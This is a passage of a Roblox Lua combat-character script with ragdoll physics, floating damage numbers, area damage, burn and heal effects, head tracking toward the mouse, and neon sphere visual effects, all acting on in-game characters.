if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
local attachment1 = part:FindFirstChildOfClass("Attachment")
local attachment0 = getAttachment0(character,attachment1.Name)
if attachment0 and attachment1 then
local constraint = Instance.new("HingeConstraint")
constraint.Attachment0 = attachment0
constraint.Attachment1 = attachment1
constraint.LimitsEnabled = true
constraint.UpperAngle = 0
constraint.LowerAngle = 0
constraint.Parent = character
end
ArtificialHitbox(part)
elseif part.Name == "HumanoidRootPart" then
part:remove()
end
end
end
end
 
ragdollJoint(character,character.LowerTorso, character.UpperTorso, "Waist", "BallSocket", {
{"LimitsEnabled",true};
{"UpperAngle",5};
})
if character:FindFirstChild("Head") then
ragdollJoint(character,character.UpperTorso, character.Head, "Neck", "BallSocket", {
{"LimitsEnabled",true};
{"UpperAngle",15};
})
end
 
local handProperties = {
{"LimitsEnabled", true};
{"UpperAngle",0};
{"LowerAngle",0};
}
ragdollJoint(character,character.LeftLowerArm, character.LeftHand, "LeftWrist", "Hinge", handProperties)
ragdollJoint(character,character.RightLowerArm, character.RightHand, "RightWrist", "Hinge", handProperties)
 
local shinProperties = {
{"LimitsEnabled", true};
{"UpperAngle", 0};
{"LowerAngle", -75};
}
ragdollJoint(character,character.LeftUpperLeg, character.LeftLowerLeg, "LeftKnee", "Hinge", shinProperties)
ragdollJoint(character,character.RightUpperLeg, character.RightLowerLeg, "RightKnee", "Hinge", shinProperties)
 
local footProperties = {
{"LimitsEnabled", true};
{"UpperAngle", 15};
{"LowerAngle", -45};
}
ragdollJoint(character,character.LeftLowerLeg, character.LeftFoot, "LeftAnkle", "Hinge", footProperties)
ragdollJoint(character,character.RightLowerLeg, character.RightFoot, "RightAnkle", "Hinge", footProperties)
if KeepArms == true then
ragdollJoint(character,character.UpperTorso, character.RightUpperArm, "RightShoulder", "BallSocket")
ragdollJoint(character,character.RightUpperArm, character.RightLowerArm, "RightElbow", "BallSocket")
ragdollJoint(character,character.UpperTorso, character.LeftUpperArm, "LeftShoulder", "BallSocket")
ragdollJoint(character,character.LeftUpperArm, character.LeftLowerArm, "LeftElbow", "BallSocket")
end
ragdollJoint(character,character.LowerTorso, character.LeftUpperLeg, "LeftHip", "BallSocket")
ragdollJoint(character,character.LowerTorso, character.RightUpperLeg, "RightHip", "BallSocket")
game:GetService("Debris"):AddItem(character,50)
end))
end
 
function Ragdoll(Character2,CharTorso,KeepArms)
coroutine.resume(coroutine.create(function()
Character2:BreakJoints()
if Character2:FindFirstChild("HumanoidRootPart") then
Character2.HumanoidRootPart:Destroy()
else
end
local hum = Character2:FindFirstChildOfClass("Humanoid")
hum:remove()
local function Scan(ch)
local e
for e = 1,#ch do
Scan(ch[e]:GetChildren())
if ch[e].ClassName == "Weld" or ch[e].ClassName == "Motor6D" then
ch[e]:remove()
end
end
end
local NEWHUM = Instance.new("Humanoid")
NEWHUM.Health = 0
NEWHUM.MaxHealth = 0
NEWHUM.PlatformStand = true
NEWHUM.Parent = Character2
NEWHUM.DisplayDistanceType = "None"
 
local ch = Character2:GetChildren()
local i
for i = 1,#ch do
if ch[i].Name == "THandle1" or ch[i].Name == "THandle2" then
ch[i]:remove()
end
end
 
local Torso2 = Character2.Torso
local movevector = Vector3.new()
 
if Torso2 then
movevector = CFrame.new(CharTorso.Position,Torso2.Position).lookVector
local Head = Character2:FindFirstChild("Head")
if Head then
local Neck = Instance.new("Weld")
Neck.Name = "Neck"
Neck.Part0 = Torso2
Neck.Part1 = Head
Neck.C0 = CFrame.new(0, 1.5, 0)
Neck.C1 = CFrame.new()
Neck.Parent = Torso2
 
end
local Limb = Character2:FindFirstChild("Right Arm")
if Limb and KeepArms == true then
 
Limb.CFrame = Torso2.CFrame * CFrame.new(1.5, 0, 0)
local Joint = Instance.new("Glue")
Joint.Name = "RightShoulder"
Joint.Part0 = Torso2
Joint.Part1 = Limb
Joint.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
Joint.C1 = CFrame.new(-0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
Joint.Parent = Torso2
 
local B = Instance.new("Part")
B.TopSurface = 0
B.BottomSurface = 0
B.formFactor = "Symmetric"
B.Size = Vector3.new(1, 1, 1)
B.Transparency = 1
B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
B.Parent = Character2
local W = Instance.new("Weld")
W.Part0 = Limb
W.Part1 = B
W.C0 = CFrame.new(0, -0.5, 0)
W.Parent = Limb
 
end
local Limb = Character2:FindFirstChild("Left Arm")
if Limb and KeepArms == true then
 
Limb.CFrame = Torso2.CFrame * CFrame.new(-1.5, 0, 0)
local Joint = Instance.new("Glue")
Joint.Name = "LeftShoulder"
Joint.Part0 = Torso2
Joint.Part1 = Limb
Joint.C0 = CFrame.new(-1.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
Joint.C1 = CFrame.new(0, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
Joint.Parent = Torso2
 
local B = Instance.new("Part")
B.TopSurface = 0
B.BottomSurface = 0
B.formFactor = "Symmetric"
B.Size = Vector3.new(1, 1, 1)
B.Transparency = 1
B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
B.Parent = Character2
local W = Instance.new("Weld")
W.Part0 = Limb
W.Part1 = B
W.C0 = CFrame.new(0, -0.5, 0)
W.Parent = Limb
 
end
local Limb = Character2:FindFirstChild("Right Leg")
if Limb then
 
Limb.CFrame = Torso2.CFrame * CFrame.new(0.5, -2, 0)
local Joint = Instance.new("Glue")
Joint.Name = "RightHip"
Joint.Part0 = Torso2
Joint.Part1 = Limb
Joint.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
Joint.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
Joint.Parent = Torso2
 
local B = Instance.new("Part")
B.TopSurface = 0
B.BottomSurface = 0
B.formFactor = "Symmetric"
B.Size = Vector3.new(1, 1, 1)
B.Transparency = 1
B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
B.Parent = Character2
local W = Instance.new("Weld")
W.Part0 = Limb
W.Part1 = B
W.C0 = CFrame.new(0, -0.5, 0)
W.Parent = Limb
 
end
local Limb = Character2:FindFirstChild("Left Leg")
if Limb then
 
Limb.CFrame = Torso2.CFrame * CFrame.new(-0.5, -2, 0)
local Joint = Instance.new("Glue")
Joint.Name = "LeftHip"
Joint.Part0 = Torso2
Joint.Part1 = Limb
Joint.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
Joint.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
Joint.Parent = Torso2
 
local B = Instance.new("Part")
B.TopSurface = 0
B.BottomSurface = 0
B.formFactor = "Symmetric"
B.Size = Vector3.new(1, 1, 1)
B.Transparency = 1
B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
B.Parent = Character2
local W = Instance.new("Weld")
W.Part0 = Limb
W.Part1 = B
W.C0 = CFrame.new(0, -0.5, 0)
W.Parent = Limb
 
end
--[
local Bar = Instance.new("Part")
Bar.TopSurface = 0
Bar.BottomSurface = 0
Bar.formFactor = "Symmetric"
Bar.Size = Vector3.new(1, 1, 1)
Bar.Transparency = 1
Bar.CFrame = Torso2.CFrame * CFrame.new(0, 0.5, 0)
Bar.Parent = Character2
local Weld = Instance.new("Weld")
Weld.Part0 = Torso2
Weld.Part1 = Bar
Weld.C0 = CFrame.new(0, 0.5, 0)
Weld.Parent = Torso2
--]]
end
Character2.Parent = workspace
 game:GetService("Debris"):AddItem(Character2,90)
 
return Character2,Torso2
end))
end

--haha no damage func because damage func BORINGLY STUPID
--ShowDamage(Part.CFrame * CFrame.new(0, 0, Part.Size.Z / 2).p + Vector3.new(0, 1.5, 0), -Damage, 1.5, Part.BrickColor.Color)
function ShowDamage(Pos, Text, Time, Color)
coroutine.resume(coroutine.create(function()
foundtext = false
if FXFolder:FindFirstChild("DamagePart_"..script.Name) then
game.Debris:AddItem(FXFolder:FindFirstChild("DamagePart_"..script.Name),1)
foundtext = true
else
foundtext = false
end 
local EffPart = Instance.new("Part",FXFolder)
EffPart.Anchored = true
EffPart.Size = vt(0.01,0.01,0.01)
EffPart.Name = "DamagePart_"..script.Name
EffPart.Transparency = 1
EffPart.Position = Pos
local gui = script.GuiStuff.DamageGUI:Clone()
gui.Parent = EffPart
gui.Enabled = true
gui.dmg.Text = Text
gui.dmg.TextStrokeColor3 = Color
gui.img.ImageColor3 = Color
gui.border.ImageColor3 = Color3.fromRGB(0, 52, 130)
gui.borderin.ImageColor3 = Color3.fromRGB(0, 29, 71)

gui.dmg.TextTransparency = 1
gui.img.ImageTransparency = 1
gui.border.ImageTransparency = 1
gui.borderin.ImageTransparency = 1
local numlo = 0
for i = 0,4,0.1 do
swait()
if gui.Parent ~= nil then
numlo = numlo + 1/40
gui.StudsOffset = Vector3.new(0,3+numlo,0)
gui.dmg.TextTransparency = gui.dmg.TextTransparency - 1/40
gui.img.ImageTransparency = gui.img.ImageTransparency - 1/40
gui.border.ImageTransparency = gui.border.ImageTransparency - 1/40
gui.borderin.ImageTransparency = gui.borderin.ImageTransparency - 1/40
gui.img.Rotation = gui.img.Rotation + 5 + DerpzMusic.PlaybackLoudness/100
gui.border.Rotation = 2 * math.cos(sine/40)
gui.borderin.Rotation = 2 * math.cos(sine/40)
end
end
for i = 0,10,0.1 do
swait()
if gui.Parent ~= nil then
gui.img.Rotation = gui.img.Rotation + 5 + DerpzMusic.PlaybackLoudness/100
gui.border.Rotation = 2 * math.cos(sine/40)
gui.borderin.Rotation = 2 * math.cos(sine/40)
end
end

for i = 0,3,0.1 do
swait()
if gui.Parent ~= nil then
numlo = numlo + .1
gui.border.Rotation = gui.border.Rotation - 1
gui.borderin.Rotation = gui.borderin.Rotation - 1
gui.StudsOffset = Vector3.new(0,4+numlo,0)
gui.dmg.TextTransparency = gui.dmg.TextTransparency + 1/30
gui.img.ImageTransparency = gui.img.ImageTransparency + 1/30
gui.border.ImageTransparency = gui.border.ImageTransparency + 1/30
gui.borderin.ImageTransparency = gui.borderin.ImageTransparency + 1/30
gui.img.Rotation = gui.img.Rotation + 5 + DerpzMusic.PlaybackLoudness/100
end
end
EffPart:Destroy()


end))
end
function MagniDamage(Parte, magni, mindam, maxdam, knock, Typee) --for compatibility with old moves

DerpzDmg({

Part = Parte,
Magnitude = magni,
MinimumDamage = mindam,
MaximumDamage = maxdam,
--Knockback is unused, For now
Type = "Normal" --Can't be anything else unfortunately

})

end
function DerpzDmg(InfoTable) --used to be (Part, magni, mindam, maxdam, knock, Type)
for _, c in pairs(workspace:children()) do
local targethum = c:findFirstChildOfClass("Humanoid")
if targethum ~= nil then
local head = c:findFirstChild("Head")
if head ~= nil then
local targ = head.Position - InfoTable.Part.Position
local mag = targ.magnitude
if InfoTable.Magnitude >= mag and c.Name ~= Player.Name then
if InfoTable.Type == nil or InfoTable.Type == "Normal" then
if targethum.Health > 0.01 then
local Damage = math.random(InfoTable.MinimumDamage,InfoTable.MaximumDamage)
if Damage ~= 100 and Damage < 99 then
-- targethum:TakeDamage(Damage)
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), tostring(-Damage), 1.5, head.Color)
print("Damaged "..c.Name)
elseif Damage == 100 or Damage > 99 then
print("Killed "..c.Name)
if targethum:GetState() == Enum.HumanoidStateType.Dead then
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), "DEATH", 1.5, BrickColor.new("Really red").Color)
end
if c:FindFirstChild("Torso") then
c:FindFirstChild("Torso").CFrame = c:FindFirstChild("Torso").CFrame * angles(math.rad(2), math.rad(0), math.rad(0))
Ragdoll(c,Torso,true)
elseif c:FindFirstChild("UpperTorso") then
R15Ragdoll(c,true)
end
end
elseif targethum.Health < 0.01 then
print("Killed "..c.Name)
if targethum:GetState() == Enum.HumanoidStateType.Dead then
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), "DEATH", 1.5, BrickColor.new("Really red").Color)
end
if c:FindFirstChild("Torso") then
c:FindFirstChild("Torso").CFrame = c:FindFirstChild("Torso").CFrame * angles(math.rad(2), math.rad(0), math.rad(0))
Ragdoll(c,Torso,true)
elseif c:FindFirstChild("UpperTorso") then
R15Ragdoll(c,true)
end
end
elseif InfoTable.Type == "Burn" then
if InfoTable.TypeInfoNeeded == nil or InfoTable.TypeInfoNeeded == false then
--We can't continue, so print in output so the user knows the scripter has messed up
warn("Cannot do DerpzDmg: TypeInfoNeeded is either nonexistant or set to false! Type: "..InfoTable.Type)
else
--Do the function
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), "ABLAZE", 1.5, Color3.fromRGB(255, 180, 0))
Sounde = nil
FireEff = nil
KeepDamaging = true
if c:FindFirstChild("Torso") then
FireEff = FXFolder.Fire:Clone()
FireEff.Enabled = true
FireEff.Parent = c.Torso
Sounde = Instance.new("Sound",FireEff.Parent)
Sounde.Looped = true
Sounde.SoundId = "rbxassetid://443980606"
Sounde:Play()
soundeffect(5207654419,1.2,Sounde.Parent,10,0,"eeeaeaaaragdg")
elseif c:FindFirstChild("UpperTorso") then
FireEff = FXFolder.Fire:Clone()
FireEff.Enabled = true
FireEff.Parent = c.UpperTorso
Sounde = Instance.new("Sound",FireEff.Parent)
Sounde.Looped = true
Sounde.SoundId = "rbxassetid://443980606"
Sounde:Play()
soundeffect(5207654419,1.2,Sounde.Parent,10,0,"eeeaeaaaragdg")
end
for i = 0,InfoTable.FireDamageAmount do
wait(InfoTable.FireDamageTime)
if KeepDamaging then
if targethum.Health > 0.01 then
local Damage = math.random(InfoTable.MinimumDamage,InfoTable.MaximumDamage)
if Damage ~= 100 and Damage < 99 then
targethum:TakeDamage(Damage)
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), tostring(-Damage), 1.5, head.Color)
print("Damaged "..c.Name)
elseif Damage == 100 or Damage > 99 then
print("Killed "..c.Name)
if targethum:GetState() == Enum.HumanoidStateType.Dead then
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), "DEATH", 1.5, BrickColor.new("Really red").Color)
end
if c:FindFirstChild("Torso") then
c:FindFirstChild("Torso").CFrame = c:FindFirstChild("Torso").CFrame * angles(math.rad(2), math.rad(0), math.rad(0))
Ragdoll(c,Torso,true)
elseif c:FindFirstChild("UpperTorso") then
R15Ragdoll(c,true)
end
end
elseif targethum.Health < 0.01 then
print("Killed "..c.Name)
KeepDamaging = false
if targethum:GetState() == Enum.HumanoidStateType.Dead then
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), "DEATH", 1.5, BrickColor.new("Really red").Color)
end
if c:FindFirstChild("Torso") then
c:FindFirstChild("Torso").CFrame = c:FindFirstChild("Torso").CFrame * angles(math.rad(2), math.rad(0), math.rad(0))
Ragdoll(c,Torso,true)
elseif c:FindFirstChild("UpperTorso") then
R15Ragdoll(c,true)
end
end
else
--Do nothing, As the player hit by fire is already dead
--print("damage has stopped")
end

end
FireEff.Enabled = false
FireEff.Drag = 0
game.Debris:AddItem(FireEff,5)
Sounde:Destroy()
end
elseif InfoTable.Type == "Heal" then
if targethum.Health > 0.01 then
local Damage = math.random(InfoTable.MinimumDamage,InfoTable.MaximumDamage)
if Damage ~= 100 and Damage < 99 then
soundeffect(260421433,0.95,c.Head,10,0,"a")
targethum.Health = targethum.Health + Damage
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), tostring(Damage), 1.5, Color3.new(0,1,0))
print("Healed "..c.Name)
elseif Damage == 100 or Damage > 99 then
soundeffect(2017454590,1,c.Head,10,0,"e")
targethum.Health = targethum.MaxHealth
ShowDamage(head.CFrame * CFrame.new(0, 0, head.Size.Z / 2).Position + Vector3.new(0, 1.5, 0), "HEALED", 1.5, Color3.new(0,1,0))
print("Fully Healed "..c.Name)

end
end
end--Type If statement end
end

end
end
end
--function end
end



local RegionModule = RR3()
NewHitbox = function(CFrame,Size)
local NewRegion = RegionModule.new(CFrame,Size)
return NewRegion
end

--SUPERIOR VERSION OF THIS CHANGE MY MIND LOOOOL

function DerpzDmgInstant(Region)
local Group = Region:FindPartsInRegion3(char, math.huge)
for i,v in pairs(Group) do
if v.Parent:FindFirstChild("HumanoidRootPart") and v.Parent:FindFirstChildOfClass("Humanoid") then

--v.Parent:FindFirstChildOfClass("Humanoid"):TakeDamage(math.random(mindam,maxdam))
local DoDmg = true
for e,a in pairs(v.Parent:GetChildren()) do
if v.Name == "DEMOLISHED" then
DoDmg = false
else

end
end
if DoDmg then
dmg(v.Parent)
elseif not DoDmg then

end
end
end
end


function rayCast(Pos, Dir, Max, Ignore)-- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

--[Head movement core]

local Ang = CFrame.Angles
local aSin = math.asin
local aTan = math.atan

--[Constants]:

local Cam = cam
headmovementenabled = true
local Plr = plr
local Mouse = mouse
local Body = Plr.Character
local Head = hed
local Hum = hum
local Core = Body:WaitForChild("HumanoidRootPart")
local IsR6 = (Hum.RigType.Value==0)
local Trso = (IsR6 and Body:WaitForChild("Torso")) or Body:WaitForChild("UpperTorso")
local Neck = (IsR6 and Trso:WaitForChild("Neck")) or Head:WaitForChild("Neck")
local Waist = (not IsR6 and Trso:WaitForChild("Waist"))
local MseGuide = true
local TurnCharacterToMouse = false
local HeadHorFactor = 1
local HeadVertFactor = 0.6
local BodyHorFactor = 0.5
local BodyVertFactor = 0.4
local UpdateSpeed = 0.1

local NeckOrgnC0 = Neck.C0
local WaistOrgnC0 = (not IsR6 and Waist.C0)

--[Setup]:

Neck.MaxVelocity = 1/3

-- Activation]:
if TurnCharacterToMouse == true then
MseGuide = true
HeadHorFactor = 0
BodyHorFactor = 0
end
local lol
lol=game:GetService("RunService").Stepped:Connect(function()
if not sval.Character() then lol:Disconnect() return end
if attack == false then
local CamCF = Cam.CoordinateFrame
if ((IsR6 and Body["Torso"]) or Body["UpperTorso"])~=nil and Body["Head"]~=nil then
local TrsoLV = Trso.CFrame.lookVector
local HdPos = Head.CFrame.p
if IsR6 and Neck or Neck and Waist then
if UpdateSpeed == 0.1 then
local Dist = nil;
local Diff = nil;
if not MseGuide then
Dist = (Head.CFrame.p-CamCF.p).magnitude
Diff = Head.CFrame.Y-CamCF.Y
if not IsR6 then
Neck.C0 = Neck.C0:lerp(NeckOrgnC0*Ang((aSin(Diff/Dist)*HeadVertFactor), -(((HdPos-CamCF.p).Unit):Cross(TrsoLV)).Y*HeadHorFactor, 0), UpdateSpeed/2)
Waist.C0 = Waist.C0:lerp(WaistOrgnC0*Ang((aSin(Diff/Dist)*BodyVertFactor), -(((HdPos-CamCF.p).Unit):Cross(TrsoLV)).Y*BodyHorFactor, 0), UpdateSpeed/2)
else
Neck.C0 = Neck.C0:lerp(NeckOrgnC0*Ang(-(aSin(Diff/Dist)*HeadVertFactor), 0, -(((HdPos-CamCF.p).Unit):Cross(TrsoLV)).Y*HeadHorFactor),UpdateSpeed/2)
end
else
local Point = Mouse.Hit.p
Dist = (Head.CFrame.p-Point).magnitude
Diff = Head.CFrame.Y-Point.Y
if not IsR6 then
Neck.C0 = Neck.C0:lerp(NeckOrgnC0*Ang(-(aTan(Diff/Dist)*HeadVertFactor), (((HdPos-Point).Unit):Cross(TrsoLV)).Y*HeadHorFactor, 0), UpdateSpeed/2)
Waist.C0 = Waist.C0:lerp(WaistOrgnC0*Ang(-(aTan(Diff/Dist)*BodyVertFactor), (((HdPos-Point).Unit):Cross(TrsoLV)).Y*BodyHorFactor, 0), UpdateSpeed/2)
else
Neck.C0 = Neck.C0:lerp(NeckOrgnC0*Ang((aTan(Diff/Dist)*HeadVertFactor), 0, (((HdPos-Point).Unit):Cross(TrsoLV)).Y*HeadHorFactor), UpdateSpeed/2)
end
end
end
end
end
if TurnCharacterToMouse == true then
Hum.AutoRotate = false
Core.CFrame = Core.CFrame:lerp(CFrame.new(Core.Position, Vector3.new(Mouse.Hit.p.x, Core.Position.Y, Mouse.Hit.p.z)), UpdateSpeed / 2)
else
Hum.AutoRotate = true
end
end
end)
------------------




function sphere(bonuspeed,type,pos,scale,value,color)
local type = type
local rng = Instance.new("Part", char)
rng.Anchored = true
if ModeOfGlitch ~= 9 then
rng.BrickColor = color
elseif ModeOfGlitch == 9 then
rng.Color = Color3.new(kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000)
end
rng.CanCollide = false
rng.FormFactor = 3
rng.Name = "Ring"
rng.Material = "Neon"
rng.Size = Vector3.new(1, 1, 1)
rng.Transparency = 0
rng.TopSurface = 0
rng.BottomSurface = 0
rng.CFrame = pos
local rngm = Instance.new("SpecialMesh", rng)
rngm.MeshType = "Sphere"
rngm.Scale = scale
if rainbowmode == true then
rng.Color = Color3.new(r/255,g/255,b/255)
end
if ModeOfGlitch == 9 then
coroutine.resume(coroutine.create(function()
while true do
swait()
if rng.Parent ~= nil then
rng.Color = Color3.new(kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000)
else
break
end
end
end))
end
local scaler2 = 1
if type == "Add" then
scaler2 = 1*value
elseif type == "Divide" then
scaler2 = 1/value
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if rainbowmode == true then
rng.Color = Color3.new(r/255,g/255,b/255)
end
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
end
if chaosmode == true then
rng.BrickColor = BrickColor.random()
end
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2*bonuspeed, scaler2*bonuspeed)
end
rng:Destroy()
end))
end
TheGameChangerValue = false
if script.Effects.CoreLightUpFuncs.RobloxRLUACompatibility.Assets.VocabluaryMode.Value == true then --What are you doing here???
--Enabled, Somehow.
TheGameChangerValue = true
else
--Not enabled.
end

function sphere2(bonuspeed,type,pos,scale,value,value2,value3,color)
local type = type
local rng = Instance.new("Part", char)
rng.Anchored = true
if ModeOfGlitch ~= 9 then
rng.BrickColor = color
elseif ModeOfGlitch == 9 then
rng.Color = Color3.new(kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000)
end
rng.CanCollide = false
rng.FormFactor = 3
rng.Name = "Ring"
rng.Material = "Neon"
rng.Size = Vector3.new(1, 1, 1)
rng.Transparency = 0
rng.TopSurface = 0
rng.BottomSurface = 0
rng.CFrame = pos
local rngm = Instance.new("SpecialMesh", rng)
rngm.MeshType = "Sphere"
rngm.Scale = scale
local scaler2 = 1
local scaler2b = 1
local scaler2c = 1
if type == "Add" then
scaler2 = 1*value
scaler2b = 1*value2
scaler2c = 1*value3
elseif type == "Divide" then
scaler2 = 1/value
scaler2b = 1/value2
scaler2c = 1/value3
end
if ModeOfGlitch == 9 then
coroutine.resume(coroutine.create(function()
while true do
swait()
if rng.Parent ~= nil then
rng.Color = Color3.new(kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000,kan.PlaybackLoudness/1000)
else
break
end
end
end))
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()
if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
scaler2b = scaler2b - 0.01*value/bonuspeed
scaler2c = scaler2c - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
scaler2b = scaler2b - 0.01/value*bonuspeed
scaler2c = scaler2c - 0.01/value*bonuspeed
end
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2b*bonuspeed, scaler2c*bonuspeed)
end
rng:Destroy()
end))
end

function slash(bonuspeed,rotspeed,rotatingop,typeofshape,type,typeoftrans,pos,scale,value,color)
Whatever:FireAllClients("slash",bonuspeed,rotspeed,rotatingop,typeofshape,type,typeoftrans,pos,scale,value,color,effectz)
end


function sphereMK(bonuspeed,FastSpeed,type,pos,x1,y1,z1,value,color,outerpos)
local type = type
local rng = Instance.new("Part", char)
rng.Anchored = true

rng.CanCollide = false
rng.FormFactor = 3
rng.Name = "Ring"
rng.Material = "Neon"
rng.Size = Vector3.new(1, 1, 1)
rng.Transparency = 0
rng.TopSurface = 0
rng.BottomSurface = 0
rng.CFrame = pos
rng.CFrame = rng.CFrame + rng.CFrame.lookVector*outerpos
local rngm = Instance.new("SpecialMesh", rng)
rngm.MeshType = "Sphere"
rngm.Scale = vt(x1,y1,z1)



local scaler2 = 1
local speeder = FastSpeed
if type == "Add" then
scaler2 = 1*value
elseif type == "Divide" then
scaler2 = 1/value
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()

if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
end

speeder = speeder - 0.01*FastSpeed*bonuspeed
rng.CFrame = rng.CFrame + rng.CFrame.lookVector*speeder*bonuspeed
rng.Transparency = rng.Transparency + 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2*bonuspeed, 0)
end
rng:Destroy()
end))
end


function sphereMKCharge(bonuspeed,FastSpeed,type,pos,x1,y1,z1,value,color,outerpos)
local type = type
local rng = Instance.new("Part", char)
rng.Anchored = true
rng.CanCollide = false
rng.FormFactor = 3
rng.Name = "Ring"
rng.Material = "Neon"
rng.Size = Vector3.new(1, 1, 1)
rng.Transparency = 1
rng.TopSurface = 0
rng.BottomSurface = 0
rng.CFrame = pos
rng.CFrame = rng.CFrame + rng.CFrame.lookVector*outerpos
local rngm = Instance.new("SpecialMesh", rng)
rngm.MeshType = "Sphere"
rngm.Scale = vt(x1,y1,z1)

local scaler2 = 1
local speeder = FastSpeed
if type == "Add" then
scaler2 = 1*value
elseif type == "Divide" then
scaler2 = 1/value
end
coroutine.resume(coroutine.create(function()
for i = 0,10/bonuspeed,0.1 do
swait()

if type == "Add" then
scaler2 = scaler2 - 0.01*value/bonuspeed
elseif type == "Divide" then
scaler2 = scaler2 - 0.01/value*bonuspeed
end

speeder = speeder - 0.01*FastSpeed*bonuspeed
rng.CFrame = rng.CFrame + rng.CFrame.lookVector*speeder*bonuspeed
rng.Transparency = rng.Transparency - 0.01*bonuspeed
rngm.Scale = rngm.Scale + Vector3.new(scaler2*bonuspeed, scaler2*bonuspeed, 0)
end
rng:Destroy()
end))
end

dmgbrickcolor = MAINRUINCOLOR
function dmg(dude)
if dude.Name ~= Character.Name then
print("Fired dmg")
local keptcolor = dmgbrickcolor
--[[local val = Instance.new("BoolValue",dude)
val.Name = "IsHit"]]--
local ds = coroutine.wrap(function()
dude:WaitForChild("Head"):BreakJoints()
for i, v in pairs(dude:GetChildren()) do
if v:IsA("Part") or v:IsA("MeshPart") and v.Name ~= "HumanoidRootPart" then
v.Name = "DEMOLISHED"
end
end

targetted = nil
soundeffect(623904185,0.5,char,1.5,0,"a")
soundeffect(257001402,0.1,char,1,0,"a")
--CFuncs["Sound"].Create("rbxassetid://623904185", char, 1.5, 0.5)
--CFuncs["Sound"].Create("rbxassetid://257001402", char, 1, 0.1)
coroutine.resume(coroutine.create(function()
for i, v in pairs(dude:GetChildren()) do
if v:IsA("Accessory") then
v:Destroy()
end
if v:IsA("Model") then
v:Destroy()
end
if v:IsA("Part") or v:IsA("MeshPart") then
for x, o in pairs(v:GetChildren()) do
if o:IsA("Decal") then
o:Destroy()
end
end
v:BreakJoints()
coroutine.resume(coroutine.create(function()
v.Material = "Neon"
v.CanCollide = false
v.Anchored = false
local bld = script.Effects.DmgDust:Clone()
bld.Parent = v
bld.Color = ColorSequence.new(Color3.new(1,1,1),MAINRUINCOLOR)
bld.Enabled = true
local sbs = Instance.new("BodyPosition", v)
sbs.P = 3000
sbs.D = 1000
sbs.maxForce = Vector3.new(50000000000, 50000000000, 50000000000)
sbs.position = v.Position + Vector3.new(math.random(-2,2),10 + math.random(-2,2),math.random(-2,2))
coroutine.resume(coroutine.create(function()
v.Color = Color3.new(1,1,1)

for i = 0, 7,0.1 do
swait()
--DerpzEff("Block",
--{
----Put tween info here, Don't use TweenInfo
--Time = .2,
--EasingStyle = "Sine",
--EasingDirection = "Out",
--RepeatCount = 0,
--Reverses = false,



--},
----TweenInfo.new(1,Enum.EasingStyle.Back,Enum.EasingDirection.Out,0,true,0),
--{
--CFrame = v.CFrame,
--EndCFrame = v.CFrame,
--Color = Color3.new(1,1,1),
--EndColor = Color3.new(.5,.5,.5),
--Transparency = 0,
--EndTrans = 1,
--Size = Vector3.new(0,0,0),
--EndSize = Vector3.new(1, 1, 1),
--Material = "Neon",
--Reflectance = 0,
--}
--)
--Above caused massive lag in servers and is barely visible, So I cut it out.
--WACKYEFFECT({
--Time = 10, -- Time. Duh
--EffectType = "Box", -- Effect Type. Effect Types: "Box", "Wedge", "Sphere", "Ring", "Wave", "Slash", "Swirl", "Round Slash", "Skull", "Crystal"
--Size = VT(0.01,0.01,0.01), -- Start Size
--Size2 = VT(1, 1, 1), -- End Size
